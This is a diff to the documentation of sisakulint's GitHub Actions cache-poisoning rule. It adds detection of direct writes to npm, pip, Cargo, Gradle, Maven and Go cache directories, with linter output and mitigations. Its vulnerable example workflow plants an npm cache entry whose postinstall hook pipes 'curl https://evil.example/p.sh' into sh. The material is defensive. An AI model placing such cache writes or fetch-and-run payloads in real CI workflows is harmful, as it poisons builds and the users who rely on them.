@@ -29,12 +29,14 @@ This vulnerability aligns with **OWASP CI/CD Security Risk CICD-SEC-9: Improper 
 1. **Indirect Cache Poisoning**: Dangerous combinations of untrusted triggers with unsafe checkout and cache operations
 2. **Composite Action Cache Poisoning**: Unsafe checkout followed by a composite action that invokes `actions/cache` or a setup action with caching enabled
 3. **Direct Cache Poisoning**: Untrusted input in cache configuration (key, restore-keys, path) that can be exploited regardless of trigger type
+4. **Package Cache Directory Writes**: Direct writes to package manager cache directories that can be persisted by later cache save steps
 
-The rule detects four types of cache poisoning attacks:
+The rule detects five types of cache poisoning attacks:
 1. **Indirect Cache Poisoning**: Untrusted triggers + unsafe checkout + cache actions
 2. **Composite Action Cache Poisoning**: Untrusted triggers + unsafe checkout + local or remote composite actions that use cache
-3. **Cache Hierarchy Exploitation**: Workflows that can write to default branch cache via external triggers
-4. **Cache Eviction Risk**: Multiple cache actions that could enable cache flooding attacks
+3. **Package Cache Directory Writes**: Direct writes to package manager cache directories from `run:` scripts
+4. **Cache Hierarchy Exploitation**: Workflows that can write to default branch cache via external triggers
+5. **Cache Eviction Risk**: Multiple cache actions that could enable cache flooding attacks
 
 #### Key Features
 
@@ -44,6 +46,7 @@ The rule detects four types of cache poisoning attacks:
 - **Composite Action Metadata Resolution**: Resolves local and remote action metadata, including `owner/repo@ref` and `owner/repo/path@ref`, to find direct and bounded transitive cache usage
 - **Job-Level Trigger Scoping**: Honors job-level `if:` filters such as `github.event_name == 'push'` to avoid applying workflow-level unsafe triggers to jobs that cannot run on them
 - **Direct Cache Input Validation**: Checks for untrusted expressions in `key`, `restore-keys`, and `path` inputs
+- **Package Cache Directory Write Detection**: Detects `run:` scripts that write directly into npm, pip, Cargo, Gradle, Maven, or Go cache directories
 - **Job Isolation**: Correctly scopes detection to individual jobs
 - **Smart Checkout Tracking**: Resets unsafe state when a safe checkout follows an unsafe one
 - **Conservative Pattern Matching**: Detects direct, indirect, and unknown expression patterns
@@ -127,6 +130,20 @@ The rule triggers when untrusted input is used in cache configuration, regardles
 - `github.event.comment.body`
 - `github.head_ref`
 - And other user-controllable values
+
+#### Package Cache Directory Writes
+
+The rule also checks `run:` scripts for direct writes to package manager cache directories. This catches cases where a workflow creates or modifies dependency cache content outside the package manager, then persists it with `actions/cache/save`.
+
+Detected cache directories include:
+- npm: `~/.npm/_cacache/`
+- pip: `~/.cache/pip/`
+- Cargo: `~/.cargo/registry/`
+- Gradle: `~/.gradle/caches/`
+- Maven: `~/.m2/repository/`
+- Go modules: `~/go/pkg/mod/cache/`
+
+The rule reports direct write commands such as `mkdir`, `cp`, `mv`, `install`, `touch`, `tee`, and shell redirection with `> / >>` when the write target is one of these cache directories. Package manager commands such as `npm cache verify` or `pip cache dir` are excluded.
 
 ### Example Vulnerable Workflows
 
@@ -237,6 +254,32 @@ jobs:
 
 This pattern is risky even with `permissions: contents: read`. GitHub Actions cache writes are not controlled by the workflow `GITHUB_TOKEN` permissions in the same way as repository API access. For the same reason, the `dangerous-triggers-*` rules do not count permissions restrictions as a mitigation when cache write actions are present.
 
+#### Example 5: Package Cache Directory Write Before Cache Save
+
+```yaml
+name: Poison package cache
+on:
+  pull_request:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Write npm cache directly
+        run: |
+          mkdir -p ~/.npm/_cacache/content-v2/sha512
+          cat > ~/.npm/_cacache/content-v2/sha512/malicious <<'PAYLOAD'
+          {"scripts":{"postinstall":"curl https://evil.example/p.sh | sh"}}
+          PAYLOAD
+
+      - uses: actions/cache/save@v4
+        with:
+          path: ~/.npm
+          key: npm-${{ hashFiles('**/package-lock.json') }}
+```
+
+Direct writes to package manager cache directories are suspicious on their own. When followed by `actions/cache/save`, the workflow can persist attacker-controlled dependency cache content for later runs.
+
 ### Example Output
 
 #### Indirect Cache Poisoning Output
@@ -270,6 +313,18 @@ $ sisakulint ./bundle-size.yaml
 
 ./bundle-size.yaml:16:9: cache poisoning risk (critical): composite action 'TanStack/config/.github/setup@main' invokes 'actions/cache@v5' after checking out untrusted PR code (triggers: pull_request_target, chain: TanStack/config/.github/setup@main -> actions/cache@v5). This can persist attacker-controlled dependency state through GitHub Actions cache scope crossing; validate cached content or scope cache to PR level [cache-poisoning]
       16 👈|      - uses: TanStack/config/.github/setup@main
+```
+
+#### Package Cache Directory Write Output
+
+```bash
+$ sisakulint ./cache-directory-write.yaml
+
+./cache-directory-write.yaml:11:9: cache poisoning via package manager cache directory write: command writes directly to ~/.npm/_cacache. Direct writes to dependency cache directories can poison later actions/cache/save entries; use package manager commands or avoid saving this cache after untrusted writes [cache-poisoning]
+      11 👈|          mkdir -p ~/.npm/_cacache/content-v2/sha512
+
+./cache-directory-write.yaml:16:9: cache poisoning risk (critical): actions/cache/save follows direct writes to package manager cache directories (~/.npm/_cacache). This can persist attacker-controlled dependency cache content for later workflow runs; avoid saving caches after direct cache directory writes [cache-poisoning]
+      16 👈|      - uses: actions/cache/save@v4
 ```
 
 ### Safe Patterns
@@ -419,6 +474,13 @@ After fix
 2. **Use Content Hashing**: Use `hashFiles()` for content-based cache keys
 3. **Avoid User-Controllable Values**: Never use values from PR titles, bodies, comments, or labels in cache keys
 4. **Use Static Paths**: Use fixed paths for cache storage, not user-provided values
+
+#### For Package Cache Directory Writes
+
+1. **Avoid Direct Cache Mutation**: Do not write files directly under package manager cache directories from shell scripts
+2. **Use Package Manager Commands**: Let `npm`, `pip`, `cargo`, `gradle`, `mvn`, or `go` manage their cache content
+3. **Do Not Save After Suspicious Writes**: Avoid `actions/cache/save` after scripts that modify dependency cache directories
+4. **Isolate Untrusted Builds**: If untrusted code must run, use read-only cache restore or PR-scoped cache keys
 
 **Safe cache key patterns:**
 ```yaml
